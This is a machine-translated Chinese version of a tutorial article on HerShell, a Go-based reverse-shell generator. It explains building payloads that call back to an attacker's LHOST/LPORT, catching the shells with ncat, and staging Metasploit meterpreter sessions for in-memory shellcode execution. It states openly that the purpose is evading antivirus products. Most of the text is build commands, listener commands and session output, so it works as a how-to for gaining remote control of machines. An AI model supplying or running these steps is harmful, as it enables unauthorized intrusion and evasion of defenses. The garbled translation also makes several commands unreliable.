# HerShell:多平台反向外壳生成器

> 原文：<https://kalilinuxtutorials.com/hershell-multiplatform-reverse-shell-generator/>

[![HerShell : Multiplatform Reverse Shell Generator](img/1b63770820e0179a05a202f699637659.png "HerShell : Multiplatform Reverse Shell Generator")](https://1.bp.blogspot.com/-8r6a4JhySLg/Xi67SQTtfhI/AAAAAAAAEnw/K16coRzuCN8UgWjf9_eHS766PpO5FO84QCLcBGAsYHQ/s1600/New%25281%2529.png)

**Hershell** 是用 [Go](https://golang.org/) 编写的简单 TCP 反向外壳工具。它使用 TLS 来保护通信，并提供证书公钥指纹锁定功能，防止流量拦截。

支持的操作系统有:

*   **窗户**
*   **Linux**
*   **苹果操作系统**
*   **FreeBSD 和衍生品**

**为什么？**

虽然 meterpreter 的有效载荷很大，但它们有时会被 AV 产品发现。这个项目 HerShell 的目标是得到一个简单的反向 Shell，它可以在多个系统上工作。

**如何？**

因为 HerShell 是用 Go 编写的，所以您可以针对所需的架构交叉编译源代码。

**入门&依赖**

因为这是一个 Go 项目，你需要按照官方文档来设置你的 Golang 环境(使用`$GOPATH`环境变量)。

然后，只需运行`**go get github.com/lesnuages/hershell**`来获取项目。

**制造有效载荷**

为了简化，您可以使用提供的 Makefile。您可以设置以下环境变量:

*   `**GOOS**`:目标操作系统
*   **`GOARCH`** :目标架构
*   `**LHOST**`:攻击者的 IP 或域名
*   `**LPORT**`:监听端口

对于`**GOOS**`和 **`GOARCH`** 变量，可以在这里得到允许值[。](https://golang.org/doc/install/source#environment)

然而，`**Makefile**`中提供了一些辅助目标:

*   `**depends**`:生成服务器证书(反向 shell 需要)
*   `**windows32**`:构建一个 windows 32 位可执行文件(PE 32 位)
*   **`windows64`** :构建一个 windows 64 位可执行文件(PE 64 位)
*   **`linux32`** :构建一个 linux 32 位可执行文件(ELF 32 位)
*   **`linux64`** :构建一个 linux 64 位可执行文件(ELF 64 位)
*   **`macos32`** :构建一个 mac os 32 位可执行文件(Mach-O)
*   **`macos64`** :构建 mac os 64 位可执行文件(Mach-O)

对于那些目标，你只需要设置 **`LHOST`** 和 **`LPORT`** 环境变量。

**也可阅读-[如何保护自己免受常见密码攻击](https://kalilinuxtutorials.com/password-attacks/)**

**使用外壳**

一旦执行，您将获得一个远程外壳。这个定制的交互式 shell 将允许您通过 Windows 上的`cmd.exe`或 UNIX 机器上的`/bin/sh`来执行系统命令。

支持以下特殊命令:

*   **`run_shell`** :让你退出一个系统外壳(例如，允许你改变目录)
*   `inject <base64 shellcode>`:在同一个进程内存中注入一个外壳代码(base64 编码)，并执行它
*   `**meterpreter [tcp|http|https] IP:PORT**`:连接 multi/handler 从 metasploit 获取 stage2 reverse tcp、http 或 https meterpreter，并执行内存中的 shellcode(目前仅限 Windows)
*   **`exit`** :优雅地退出

**用途**

首先，您需要生成一个有效的证书:

**$ make depends**
OpenSSL req-subj '/CN = your CN . com/O = your org/C = FR '-new-new key rsa:4096-days 3650-nodes-x509-keyut server . key-out server . PEM
**生成 4096 位 RSA 私钥**
…………………………………………………………………………………………………………………………
**将新私钥写入‘server . key’**【t100

**对于 windows:**

**#预定义 32 位目标**
$ make windows 32 LHOST = 192 . 168 . 0 . 12 LPORT = 1234
**#预定义 64 位目标**
$ make windows 64 LHOST = 192 . 168 . 0 . 12 LPORT = 1234

**对于 Linux:**

**#预定义 32 位目标**
$ make Linux 32 LHOST = 192 . 168 . 0 . 12 LPORT = 1234
**#预定义 64 位目标**
$ make Linux 64 LHOST = 192 . 168 . 0 . 12 LPORT = 1234

**苹果 OS X**

**$ make MAC OS LHOST = 192 . 168 . 0 . 12 LPORT = 1234**

**例题**

**基本用法**

可以使用各种工具来处理传入的连接，例如:

*   socat
*   ncat
*   openssl 服务器模块
*   metasploit 多重处理程序(带有一个`**python/shell_reverse_tcp_ssl**`有效负载)

下面是一个关于`ncat`的例子:

**$ Ncat–SSL–SSL-cert server . PEM–SSL-key server . key-lvp 1234
Ncat:版本 7.60(https://nmap.org/ncat)
Ncat:监听 on :::1234 Ncat:监听 on 0.0.0.0:1234
Ncat:从 172.16.122.105 连接。
Ncat:来自 172.16.122.105 的连接:47814。**
【her shell】>whoami
desktop-3pvv 31a \ lab

**抄表员暂存**

**警告**:这目前只适用于 Windows 平台。

meterpreter staging 目前支持以下有效载荷:

*   **T2`windows/meterpreter/reverse_tcp`**
*   **T2`windows/x64/meterpreter/reverse_tcp`**
*   **T2`windows/meterpreter/reverse_http`**
*   **T2`windows/x64/meterpreter/reverse_http`**
*   **T2`windows/meterpreter/reverse_https`**
*   **T2`windows/x64/meterpreter/reverse_https`**

要使用正确的协议，只需指定想要使用的传输协议(tcp、http、https)

要使用 meterpreter 暂存功能，只需启动您的处理程序:

```
[14:12:45][172.16.122.105][Sessions: 0][Jobs: 0] > use exploit/multi/handler
[14:12:57][172.16.122.105][Sessions: 0][Jobs: 0] exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
payload => windows/x64/meterpreter/reverse_https
[14:13:12][172.16.122.105][Sessions: 0][Jobs: 0] exploit(multi/handler) > set lhost 172.16.122.105
lhost => 172.16.122.105
[14:13:15][172.16.122.105][Sessions: 0][Jobs: 0] exploit(multi/handler) > set lport 8443
lport => 8443
[14:13:17][172.16.122.105][Sessions: 0][Jobs: 0] exploit(multi/handler) > set HandlerSSLCert ./server.pem
HandlerSSLCert => ./server.pem
[14:13:26][172.16.122.105][Sessions: 0][Jobs: 0] exploit(multi/handler) > exploit -j
[*] Exploit running as background job 0.

[*] [2018.01.29-14:13:29] Started HTTPS reverse handler on https://172.16.122.105:8443
[14:13:29][172.16.122.105][Sessions: 0][Jobs: 1] exploit(multi/handler) >
```

然后，在`**hershell**`中，使用 **`meterpreter`** 命令:

**【赫谢尔】>抄表员 https 172.16.122.105:8443**

新的计量员会议将在`**msfconsole**`中弹出:

```
[14:13:29][172.16.122.105][Sessions: 0][Jobs: 1] exploit(multi/handler) >
[*] [2018.01.29-14:16:44] https://172.16.122.105:8443 handling request from 172.16.122.105; (UUID: pqzl9t5k) Staging x64 payload (206937 bytes) ...
[*] Meterpreter session 1 opened (172.16.122.105:8443 -> 172.16.122.105:44804) at 2018-01-29 14:16:44 +0100

[14:16:46][172.16.122.105][Sessions: 1][Jobs: 1] exploit(multi/handler) > sessions

Active sessions
===============

  Id  Name  Type                     Information                            Connection
  --  ----  ----                     -----------                            ----------
  1         meterpreter x64/windows  DESKTOP-3PVV31A\lab @ DESKTOP-3PVV31A  172.16.122.105:8443 -> 172.16.122.105:44804 (10.0.2.15)

[14:16:48][172.16.122.105][Sessions: 1][Jobs: 1] exploit(multi/handler) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > getuid
Server username: DESKTOP-3PVV31A\lab
```

**信用**:docker file 功能的 [@khast3x](https://github.com/khast3x)

[**Download**](https://github.com/lesnuages/hershell)